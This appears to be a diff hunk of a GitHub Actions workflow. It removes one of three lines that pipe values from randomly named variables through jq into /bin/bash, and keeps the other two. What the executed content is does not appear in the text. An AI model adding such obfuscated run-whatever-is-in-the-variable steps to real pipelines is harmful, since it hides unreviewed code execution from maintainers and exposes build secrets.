@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$sukmk6822" | jq -r .uv4011 | /bin/bash
           printf '%s' "$ttout48" | jq -r .zotg8 | /bin/bash
-          echo $xlev64 | jq -r .nh7 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
